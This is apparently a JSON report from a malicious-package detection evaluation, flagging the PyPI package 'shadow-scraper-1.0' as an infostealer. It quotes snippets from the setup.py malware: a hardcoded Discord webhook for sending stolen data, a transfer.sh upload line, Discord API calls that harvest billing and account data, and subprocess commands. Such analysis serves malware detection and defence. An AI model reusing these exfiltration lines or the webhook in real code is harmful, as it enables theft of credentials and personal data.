{
  "package_name": "shadow-scraper-1.0",
  "total_matches": 15,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
      "file_name": "setup.py",
      "detection_count": 15,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code is a credential-stealing malware (infostealer) with multiple critical malicious behaviors: (1) It searches for and extracts sensitive data such as Discord tokens, browser passwords, cookies, and cryptocurrency wallet files from various browsers and applications on the victim's system. (2) It exfiltrates this data to a hardcoded Discord webhook (https://discord.com/api/webhooks/1062385162190590013/sXgEZql3ddmX2ovXbsgV5O2PWUSUOe-3s1e6NGsFDpkoSQUAC7QioN-qJYJw_acx6cPm), which is a classic data exfiltration technique used by malware. (3) It collects additional sensitive information such as the victim's public IP address, Steam and Roblox credentials, and files matching keywords related to passwords, wallets, and accounts. (4) It uses subprocess.Popen with shell=True to execute pip install commands and to kill processes, which is risky and can be abused for further malicious actions. (5) It automatically installs dependencies without user consent, and runs multiple threads to perform data theft and exfiltration in parallel, increasing stealth. (6) It uploads stolen files to external file-sharing services (e.g., transfer.sh) and sends download links to the attacker's webhook. (7) The code is heavily obfuscated, lacks legitimate application logic, and is designed to run automatically upon installation (supply chain attack vector). (8) It uses try/except blocks to suppress errors and avoid detection. (9) The code is not a legitimate package or application, but rather a malicious payload masquerading as a Python package. All these behaviors are strong, exclusive indicators of malware, specifically an infostealer.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "3",
          "type_description": "code-execution: found 4 source code matches",
          "code_snippet": "exec('')",
          "full_match": "* This package is executing OS commands in the setup.py file at shadow-scraper-1.0/setup.py:3",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "4",
          "type_description": "code-execution: found 4 source code matches",
          "code_snippet": "exec('')",
          "full_match": "* This package is executing OS commands in the setup.py file at shadow-scraper-1.0/setup.py:4",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "31",
          "type_description": "code-execution: found 4 source code matches",
          "code_snippet": "subprocess.Popen(f\"{executable} -m pip install {modl[1]}\",shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at shadow-scraper-1.0/setup.py:31",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "1142",
          "type_description": "code-execution: found 4 source code matches",
          "code_snippet": "subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\",shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at shadow-scraper-1.0/setup.py:1142",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "25",
          "type_description": "shady-links: found 11 source code matches",
          "code_snippet": "webhook='https://discord.com/api/webhooks/1062385162190590013/sXgEZql3ddmX2ovXbsgV5O2PWUSUOe-3s1e6NGsFDpkoSQUAC7QioN-qJYJw_acx6cPm' ### Replace hook",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at shadow-scraper-1.0/setup.py:25",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "123",
          "type_description": "shady-links: found 11 source code matches",
          "code_snippet": "ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at shadow-scraper-1.0/setup.py:123",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "140",
          "type_description": "shady-links: found 11 source code matches",
          "code_snippet": "'https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-US',",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at shadow-scraper-1.0/setup.py:140",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "153",
          "type_description": "shady-links: found 11 source code matches",
          "code_snippet": "Request('https://discord.com/api/v9/users/@me/entitlements/gifts',",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at shadow-scraper-1.0/setup.py:153",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "292",
          "type_description": "shady-links: found 11 source code matches",
          "code_snippet": "Request('https://discord.com/api/v6/users/@me/relationships',",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at shadow-scraper-1.0/setup.py:292",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "320",
          "type_description": "shady-links: found 11 source code matches",
          "code_snippet": "Request('https://discord.com/api/v9/users/@me/guilds?with_counts=true',",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at shadow-scraper-1.0/setup.py:320",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "347",
          "type_description": "shady-links: found 11 source code matches",
          "code_snippet": "'https://discord.com/api/v9/users/@me/billing/payments?limit=20',",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at shadow-scraper-1.0/setup.py:347",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "380",
          "type_description": "shady-links: found 11 source code matches",
          "code_snippet": "'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at shadow-scraper-1.0/setup.py:380",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "465",
          "type_description": "shady-links: found 11 source code matches",
          "code_snippet": "Request('https://discord.com/api/users/@me/billing/payment-sources',",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at shadow-scraper-1.0/setup.py:465",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "1237",
          "type_description": "shady-links: found 11 source code matches",
          "code_snippet": "upload=requests.post('https://transfer.sh/',files=files)",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at shadow-scraper-1.0/setup.py:1237",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        },
        {
          "line_number": "1300",
          "type_description": "shady-links: found 11 source code matches",
          "code_snippet": "'[discord](https://discord.com)','[riotgames](https://riotgames.com)',",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at shadow-scraper-1.0/setup.py:1300",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/shadow-scraper-1.0/shadow-scraper-1.0/setup.py",
          "relative_path": "shadow-scraper-1.0/setup.py"
        }
      ]
    }
  ]
}